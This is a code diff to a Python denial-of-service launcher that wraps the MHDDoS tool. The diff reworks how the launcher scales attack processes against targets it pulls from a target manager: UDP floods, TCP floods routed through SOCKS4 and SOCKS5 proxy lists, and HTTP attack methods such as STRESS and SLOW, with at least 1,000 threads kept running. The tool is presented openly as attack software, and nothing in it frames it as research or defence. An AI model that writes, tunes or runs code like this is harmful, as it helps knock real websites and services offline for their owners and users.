@@ -27,6 +27,8 @@ _TargetManager = TargetManager()
 # Variable to store the latest targets
 current_targets = []
 
+
+TO_KILL = False
 # -------------------------------
 # TARGET & PROXY UPDATE FUNCTIONS
 # -------------------------------
@@ -87,133 +89,112 @@ def update_proxies(period: int, proxy_timeout: float, targets: list):
 # --------------------------------------
 # HELPER FUNCTIONS FOR THREAD MANAGEMENT
 # --------------------------------------
-def get_total_spawned_threads(processes):
-    """Return the total number of threads currently spawned (summed over all processes)."""
-    return sum(thread_count for (_, thread_count) in processes)
-def predict_threads_for_cpu(cpu_limit, processes, targets):
+def monitor_cpu_usage(processes, cpu_limit, period, rpc, udp_threads, http_methods, debug, targets):
     """
-    Advanced prediction algorithm for how many new threads to spawn
-    to reach the desired CPU usage limit, ensuring that at least 1,000 threads
-    are running at any given time.
+    Continuously check overall CPU usage. If it is below the target, spawn additional
+    processes (each handling a given number of threads) to bring the usage up. If it exceeds
+    the target, randomly kill a process.
     """
-    total_cpu_usage = 0.0
-    total_threads_running = 0
-
-    # Warm up the CPU counters for all processes (set interval=None to initialize)
+    # Initialize CPU counters for all processes
     for proc, _ in processes:
         try:
             psutil.Process(proc.pid).cpu_percent(interval=None)
         except psutil.NoSuchProcess:
             continue
 
-    # Wait a short time to gather an accurate delta (this ensures our stats aren't "fake")
-    time.sleep(1)
-
-    # Get overall system CPU usage for context (this is averaged over all cores)
-    system_cpu = psutil.cpu_percent(interval=0.1)
-    total_cores = psutil.cpu_count(logical=False)  # Get number of physical cores
-    print(f"[DEBUG] Overall system CPU usage: {system_cpu:.2f}% across {total_cores} cores.")
-
-    # If no threads are running, we avoid the division by zero and set a fallback
-    if total_threads_running > 0:
-        avg_cpu_per_thread = total_cpu_usage / total_threads_running
-    else:
-        avg_cpu_per_thread = 1  # Fallback value to allow the prediction to proceed
-        print("[DEBUG] No running threads, using fallback average CPU per thread.")
-
-    print(f"[DEBUG] Average CPU usage per thread: {avg_cpu_per_thread:.4f}%")
-
-    # Baseline prediction: if no threads are running, set baseline to 1000
-    if total_threads_running == 0 or avg_cpu_per_thread == 0:
-        predicted_new_threads = 1000
-        print(f"[DEBUG] No running threads or avg_cpu_per_thread is 0, using baseline: {predicted_new_threads}")
-    else:
-        # Calculate remaining CPU capacity (note: if using multi-core, adjust if needed)
-        cpu_diff = cpu_limit - total_cpu_usage
-        if cpu_diff <= 0:
-            predicted_new_threads = 0
-            print("[DEBUG] CPU usage is at or above target. No new threads needed.")
-        else:
-            predicted_new_threads = int(cpu_diff / avg_cpu_per_thread)
-            print(f"[DEBUG] CPU difference: {cpu_diff:.2f} -> Predicted threads based on CPU diff: {predicted_new_threads}")
-
-    # Ensure that if we are adding threads, we add at least one per target.
-    if predicted_new_threads > 0 and predicted_new_threads < len(targets):
-        predicted_new_threads = len(targets)
-        print(f"[DEBUG] Adjusted predicted threads to at least one per target: {predicted_new_threads}")
-
-    # Enforce a minimum of 1,000 threads running at any given time.
-    required_min_threads = 1000 - total_threads_running
-    if required_min_threads > predicted_new_threads:
-        print(f"[DEBUG] Total threads running ({total_threads_running}) is below 1000; "
-              f"ensuring a minimum addition of {required_min_threads} threads.")
-        predicted_new_threads = required_min_threads
-
-    print(f"[DEBUG] Final predicted new threads to spawn: {predicted_new_threads} to reach {cpu_limit}% CPU usage "
-          f"and a minimum of 1000 threads running.")
-    return predicted_new_threads
-
-
-
-# ---------------------------------------
-# CPU MONITOR & DYNAMIC PROCESS SPAWNING
-# ---------------------------------------
-def monitor_cpu_usage(processes, cpu_limit, period, rpc, udp_threads, http_methods, debug, targets):
-    """
-    Continuously check overall CPU usage. If it is below the target, spawn additional 
-    processes (each handling a given number of threads) to bring the usage up. If it exceeds
-    the target, randomly kill a process.
-    """
     while True:
-        cpu_percent = psutil.cpu_percent(interval=1)  # Get the overall CPU usage
+        time.sleep(4)  # Check every 5 seconds (1s from interval + 4s sleep)
+
+        # Get overall system CPU usage (blocking for 1 sec)
+        cpu_percent = psutil.cpu_percent(interval=1)
         print(f"✨ Overall CPU usage: {cpu_percent}% 💖")
 
+        # Clean up dead processes and calculate total threads
+        active_processes = []
+        total_threads_running = 0
+        child_cpu_usage = 0.0
+        for p, thread_count in processes:
+            try:
+                proc = psutil.Process(p.pid)
+                if proc.status() != psutil.STATUS_ZOMBIE:
+                    child_cpu_usage += proc.cpu_percent(interval=None)
+                    total_threads_running += thread_count
+                    active_processes.append((p, thread_count))
+            except psutil.NoSuchProcess:
+                pass
+        processes[:] = active_processes
+
         if cpu_percent > cpu_limit:
-            print(f"💔 CPU usage exceeded {cpu_limit}%. Killing some processes to maintain fabulousness!")
-            if processes:
-                proc_tuple = random.choice(processes)
-                proc, thread_count = proc_tuple
-                print(f"✨ Killing process {proc.pid} which had {thread_count} threads 💖✨")
+            print(f"💔 CPU usage exceeded {cpu_limit}%.")
+            if TO_KILL:
+                print("Killing some processes to maintain fabulousness!")
+            if processes and TO_KILL:
+                proc_to_kill, threads_killed = random.choice(processes)
+                
+                print(f"✨ Killing process {proc_to_kill.pid} which had {threads_killed} threads 💖✨")
                 try:
-                    psutil.Process(proc.pid).terminate()
+                    p = psutil.Process(proc_to_kill.pid)
+                    p.terminate()
+                    p.wait(timeout=1)
+                except psutil.NoSuchProcess:
+                    pass  # Already gone, fabulous!
                 except Exception as e:
-                    print(f"Error terminating process {proc.pid}: {e}")
-                processes.remove(proc_tuple)
+                    print(f"Error terminating process {proc_to_kill.pid}: {e}")
+                processes.remove((proc_to_kill, threads_killed))
+
         elif cpu_percent < cpu_limit:
             print("Limit not exceeded.")
-            new_threads = predict_threads_for_cpu(cpu_limit, processes, targets)
+            
+            # Normalize child CPU usage to be comparable to system-wide usage
+            normalized_child_cpu = child_cpu_usage / psutil.cpu_count()
+            avg_cpu_per_thread = normalized_child_cpu / total_threads_running if total_threads_running > 0 else 0
+            
+            cpu_diff = cpu_limit - cpu_percent
+            if avg_cpu_per_thread > 0:
+                new_threads = int(cpu_diff / avg_cpu_per_thread)
+            else:
+                new_threads = 1000  # Fallback for initial launch
+
+            # Enforce minimum running threads
+            required_min_threads = 1000 - total_threads_running
+            if required_min_threads > new_threads:
+                new_threads = required_min_threads
+
             if new_threads > 0:
                 # Distribute the new threads evenly among targets.
-                threads_per_target = new_threads // len(targets)
-                if threads_per_target < 1:
-                    threads_per_target = 1
-                new_threads = threads_per_target * len(targets)
-                print(f"✨ Spawning {new_threads} new threads (~{threads_per_target} per target) 💖")
+                threads_per_target = max(1, new_threads // len(targets)) if targets else new_threads
+                print(f"✨ Spawning {threads_per_target * len(targets)} new threads (~{threads_per_target} per target) 💖")
 
                 # Spawn processes based on the calculated number of threads
                 for target in targets:
+                    new_p = None
                     if target.url.lower().startswith('udp://'):
                         params = ['UDP', target.url[6:], str(udp_threads), str(period)]
-                        thread_count = udp_threads
-                        p = subprocess.Popen([sys.executable, './start.py', *list(map(str, params))])
-                        processes.append((p, thread_count))
+                        new_p = subprocess.Popen([sys.executable, './start.py', *list(map(str, params))])
+                        processes.append((new_p, udp_threads))
                     elif target.url.lower().startswith('tcp://'):
-                        # For TCP, we launch two processes (one for SOCKS4 and one for SOCKS5)
                         thread_count_each = max(1, threads_per_target // 2)
-                        params = ['TCP', target.url[6:], str(thread_count_each), str(period), '4', 'socks4.txt']
-                        p = subprocess.Popen([sys.executable, './start.py', *list(map(str, params))])
-                        processes.append((p, thread_count_each))
-                        params = ['TCP', target.url[6:], str(thread_count_each), str(period), '5', 'socks5.txt']
-                        p = subprocess.Popen([sys.executable, './start.py', *list(map(str, params))])
-                        processes.append((p, thread_count_each))
+                        params_s4 = ['TCP', target.url[6:], str(thread_count_each), str(period), '4', 'socks4.txt']
+                        p4 = subprocess.Popen([sys.executable, './start.py', *list(map(str, params_s4))])
+                        processes.append((p4, thread_count_each))
+                        params_s5 = ['TCP', target.url[6:], str(thread_count_each), str(period), '5', 'socks5.txt']
+                        p5 = subprocess.Popen([sys.executable, './start.py', *list(map(str, params_s5))])
+                        processes.append((p5, thread_count_each))
                     else:
                         method = random.choice(target.methods)
                         params = [method, target.url, '0', str(threads_per_target), 'proxies.txt', str(rpc), str(period)]
-                        thread_count = threads_per_target
-                        p = subprocess.Popen([sys.executable, './start.py', *list(map(str, params))])
-                        processes.append((p, thread_count))
-
-        time.sleep(5)  # Check every 5 seconds
+                        new_p = subprocess.Popen([sys.executable, './start.py', *list(map(str, params))])
+                        processes.append((new_p, threads_per_target))
+                    
+                    # Initialize CPU measurement for the new process(es)
+                    for p_obj, _ in processes[-2 if 'tcp' in target.url.lower() else -1:]:
+                         try:
+                             psutil.Process(p_obj.pid).cpu_percent(interval=None)
+                         except psutil.NoSuchProcess:
+                             pass
+                         
+        else:
+            print("CPU usage is fabulous! No changes needed. 💖")
 
 
 # ---------------------------------------
@@ -260,14 +241,14 @@ def run_ddos(targets: list, period: int, rpc: int, udp_threads: int, http_method
         p.wait()
 
 
-def start(period: int, targets: list, rpc: int, udp_threads: int, http_methods: list, proxy_timeout: float, debug: bool, cpu_limit: float):
+def start(period: int, targets: list, rpc: int, udp_threads: int, http_methods: list, proxy_timeout: float, debug: bool, cpu_limit: float, period_attack: int):
     os.chdir('MHDDoS')  # FEMdos headquarters! 💖
     no_proxies = all(target.url.lower().startswith('udp://') for target in targets)
 
     while True:
         if not no_proxies:
             update_proxies(period, proxy_timeout, targets)
-        run_ddos(targets, period, rpc, udp_threads, http_methods, debug, cpu_limit)
+        run_ddos(targets, period_attack, rpc, udp_threads, http_methods, debug, cpu_limit)
 
 
 def init_argparse() -> argparse.ArgumentParser:
@@ -275,6 +256,8 @@ def init_argparse() -> argparse.ArgumentParser:
     # The threads argument is no longer used in this version.
     parser.add_argument('-p', '--period', type=int, default=300,
                         help='How often to update the proxies (in seconds) 💖✨')
+    parser.add_argument('-pa', '--period-attack', type=int, default=300,
+                        help='How long to update the proxies (in seconds) 💖✨')
     parser.add_argument('--proxy-timeout', type=float, default=2, metavar='TIMEOUT',
                         help='How long to wait for a proxy connection (default is 2) 💅✨')
     parser.add_argument('--rpc', type=int, default=50,
@@ -286,7 +269,9 @@ def init_argparse() -> argparse.ArgumentParser:
     parser.add_argument('--http-methods', nargs='+', default=['GET', 'STRESS', 'BOT', 'SLOW'],
                         help='List of HTTP(s) attack methods to use. Default: GET, STRESS, BOT, SLOW 💅✨')
     parser.add_argument('--cpu-limit', type=float, default=20.0,
-                        help='Max CPU usage limit as a percentage (default is 20%) 💖✨')
+                        help='Target CPU usage limit as a percentage (default is 20%) 💖✨')
+    parser.add_argument('--max-cpu-limit', type=float, default=30.0,
+                        help='Max CPU usage limit before killing processes (default is 30%) 💖✨')
     return parser
 
 
@@ -305,7 +290,7 @@ def main():
         if current_targets:
             methods = [get_methods_for_target(target) for target in current_targets]
             start(args.period, current_targets, args.rpc, args.udp_threads, methods,
-                  args.proxy_timeout, args.debug, args.cpu_limit)
+                  args.proxy_timeout, args.debug, args.cpu_limit, args.period_attack)
         else:
             print("💔 No targets available! Please check the target manager.")
             time.sleep(args.period)
